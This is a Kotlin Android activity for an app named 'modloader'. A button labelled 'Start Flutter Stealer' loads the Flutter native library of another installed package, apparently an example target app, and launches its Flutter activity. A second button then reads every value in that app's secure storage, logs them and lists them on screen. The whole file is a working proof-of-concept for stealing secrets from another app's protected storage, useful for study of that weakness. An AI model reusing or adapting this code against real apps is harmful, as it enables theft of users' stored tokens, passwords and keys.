package com.bassmd.modloader

import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxHeight
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.Button
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import com.bassmd.modloader.ui.theme.ModLoaderTheme
import com.it_nomads.fluttersecurestorage.FlutterSecureStorage
import io.flutter.embedding.android.FlutterActivity

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val context = this
        enableEdgeToEdge()
        setContent {
            ModLoaderTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Column(
                        modifier = Modifier
                            .padding(innerPadding)
                            .fillMaxWidth()
                            .fillMaxHeight(),
                        verticalArrangement = Arrangement.Center,
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        var sharedPrefs by remember { mutableStateOf(emptyMap<String, String>()) }

                        Button(
                            onClick = {
                                val pm = packageManager
                                val info: PackageInfo = pm.getPackageInfo(
                                    PACKAGE_NAME,
                                    PackageManager.GET_SHARED_LIBRARY_FILES
                                )
                                val nativeLibraryDir = info.applicationInfo.nativeLibraryDir
                                getSharedPreferences("FL", MODE_PRIVATE).edit()
                                    .putString("lib", nativeLibraryDir).apply()
                                val loader = LibLoader("$nativeLibraryDir:/system/lib64")
                                loader.loadLib("libflutter.so")
                                startActivity(
                                    FlutterActivity.createDefaultIntent(context)
                                )
                            },
                        ) {
                            Text("Start Flutter Stealer")
                        }
                        Button(
                            onClick = {
                                val secureStorage = FlutterSecureStorage.lastReference
                                sharedPrefs = secureStorage.readAll()
                                Log.d("APP", sharedPrefs.toString())
                            },
                        ) {
                            Text("Load data (use after launch)")
                        }

                        LazyColumn(
                            modifier = Modifier
                                .padding(16.dp)
                                .align(Alignment.CenterHorizontally),
                        ) {
                            items(sharedPrefs.keys.size) { index ->
                                val entry = sharedPrefs.entries.elementAt(index)
                                Text("Value: ${entry.value}")
                                Text("Key: ${entry.key}")
                            }
                        }
                    }
                }
            }
        }
    }

    companion object {
        const val PACKAGE_NAME: String = "com.example.target_app_lod"
    }
}